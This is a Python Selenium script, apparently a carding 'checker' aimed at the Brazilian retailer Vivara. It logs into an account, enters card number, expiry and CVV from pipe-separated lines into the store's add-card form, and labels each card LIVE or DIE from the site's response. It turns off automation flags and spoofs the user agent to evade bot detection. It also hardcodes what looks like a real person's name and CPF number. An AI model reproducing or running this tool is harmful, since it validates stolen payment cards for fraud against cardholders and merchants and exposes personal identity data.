import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

class VivaraChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        
    def _get_driver(self):
        """Cria e retorna uma instância do Chrome otimizada para velocidade e concorrência."""
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless=new') # Headless para o servidor
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-extensions')
        options.add_argument('--blink-settings=imagesEnabled=false')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--log-level=3')
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)
        
        # User-Agent comum
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

        # Caminhos comuns no Railway / Docker / Local
        chromium_paths = [
            '/usr/bin/google-chrome',
            '/usr/bin/chromium-browser',
            '/usr/bin/chromium'
        ]
        for path in chromium_paths:
            if os.path.exists(path):
                options.binary_location = path
                break

        chromedriver_paths = [
            '/usr/bin/chromedriver',
            '/usr/local/bin/chromedriver',
            'chromedriver.exe'
        ]

        driver = None
        for path in chromedriver_paths:
            try:
                if os.path.exists(path) or path == 'chromedriver.exe':
                    service = Service(path) if os.path.exists(path) else Service()
                    driver = webdriver.Chrome(service=service, options=options)
                    break
            except:
                continue
        
        if not driver:
            try:
                driver = webdriver.Chrome(options=options)
            except Exception as e:
                print(f"[Checker] Erro fatal ao iniciar Chrome: {e}")
                return None
        if driver:
            driver.set_page_load_timeout(30)
        return driver

    def test_card(self, linha):
        """Realiza o fluxo completo (login + check) para Vivara de forma independente."""
        driver = self._get_driver()
        if not driver:
            return "ERROR: Falha ao iniciar navegador"
            
        wait = WebDriverWait(driver, 15)
        
        try:
            # 1. Parsing da linha
            linha = linha.strip()
            partes = linha.split("|")
            if len(partes) != 4:
                return "DIE"
            
            numero, mes, ano, cvv = partes
            validade = f"{mes}/{ano[-2:]}" if len(ano) == 4 else f"{mes}/{ano}"

            # 2. Login Vivara
            driver.get("https://www.vivara.com.br/api/io/login?returnUrl=https://www.vivara.com.br/")
            
            # Lidar com cookies
            try:
                btn_cookies = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Aceitar') or contains(text(), 'Concordar')]")))
                driver.execute_script("arguments[0].click();", btn_cookies)
            except: pass

            input_email = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Ex.: exemplo@mail.com']")))
            driver.execute_script("arguments[0].click();", input_email)
            input_email.clear()
            input_email.send_keys(self.email)

            input_senha = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Adicione sua senha']")))
            driver.execute_script("arguments[0].click();", input_senha)
            input_senha.clear()
            input_senha.send_keys(self.password)

            btn_entrar = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'vtex-login-2-x-sendButton')]//button")))
            driver.execute_script("arguments[0].click();", btn_entrar)
            
            # 3. Navegação para Cartões
            # Esperamos o login ser processado olhando a URL ou um elemento da home
            wait.until(EC.url_contains("vivara.com.br"))
            time.sleep(5) # Tempo extra para garantir que o login seja totalmente processado
            driver.get("https://www.vivara.com.br/api/io/account#/cards/new")
            
            if "login" in driver.current_url and "account" not in driver.current_url:
                return "DIE: Falha no Login"

            # 4. Preenchimento de campos (com suporte a iframes)
            def fill_field(name, value):
                try:
                    element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, name)))
                    driver.execute_script("arguments[0].click();", element)
                    element.send_keys(webdriver.Keys.CONTROL + "a")
                    element.send_keys(webdriver.Keys.BACKSPACE)
                    time.sleep(0.5)
                    element.send_keys(value)
                    return True
                except:
                    driver.switch_to.default_content()
                    iframes = driver.find_elements(By.TAG_NAME, "iframe")
                    for iframe in iframes:
                        try:
                            driver.switch_to.frame(iframe)
                            elements = driver.find_elements(By.NAME, name)
                            if elements:
                                driver.execute_script("arguments[0].click();", elements[0])
                                elements[0].send_keys(webdriver.Keys.CONTROL + "a")
                                elements[0].send_keys(webdriver.Keys.BACKSPACE)
                                time.sleep(0.5)
                                elements[0].send_keys(value)
                                return True
                        except: pass
                        driver.switch_to.default_content()
                return False

            # Aguarda o formulário carregar (campo cc-number)
            try:
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "cc-number")))
            except:
                # Se não achou no topo, pode estar em iframe, a função fill_field já lida com isso.
                pass
            fill_field("cc-number", numero)
            fill_field("cardHolder", "cleomar born da silva")
            fill_field("cc-exp", validade)
            fill_field("cc-csc", cvv)
            fill_field("documentType", "CPF")
            fill_field("document", "84830336072")
            
            # 5. Salvar
            xpath_save = "//button[@type='submit'] | //button[contains(translate(., 'SALVAR NOVO CARTÃO', 'salvar novo cartão'), 'salvar novo cartão')]"
            save_clicked = False
            try:
                btn_salvar = WebDriverWait(driver, 40).until(EC.element_to_be_clickable((By.XPATH, xpath_save)))
                time.sleep(6)
                driver.execute_script("arguments[0].click();", btn_salvar)
                save_clicked = True
            except:
                driver.switch_to.default_content()
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        btns = driver.find_elements(By.XPATH, xpath_save)
                        if btns:
                            driver.execute_script("arguments[0].click();", btns[0])
                            save_clicked = True
                            break
                    except: pass
                    driver.switch_to.default_content()
            
            if not save_clicked: return "DIE: Botão Salvar não encontrado"

            # 6. Verificação LIVE/DIE
            error_msg = "Falha ao autenticar o cartão. Verifique os dados do cartão e tente novamente."
            start_check = time.time()
            while time.time() - start_check < 35:
                if error_msg in driver.page_source:
                    return "DIE"
                
                # Check iframes for error
                driver.switch_to.default_content()
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                found_error_iframe = False
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        if error_msg in driver.page_source:
                            found_error_iframe = True
                            break
                    except: pass
                    driver.switch_to.default_content()
                
                if found_error_iframe: return "DIE"
                
                # If form disappeared and no error, LIVE
                try:
                    num_fields = driver.find_elements(By.NAME, "cc-number")
                    if not num_fields or not num_fields[0].is_displayed():
                        time.sleep(0.5)
                        # Re-check error
                        if error_msg not in driver.page_source:
                            return "LIVE"
                except: pass
                time.sleep(1)
            
            return "LIVE"

        except Exception as e:
            return "DIE"
        finally:
            driver.quit()

# Alias para compatibilidade com versões anteriores
DominosChecker = VivaraChecker

# Instância global gerenciada pelo main.py
checker_instance = None
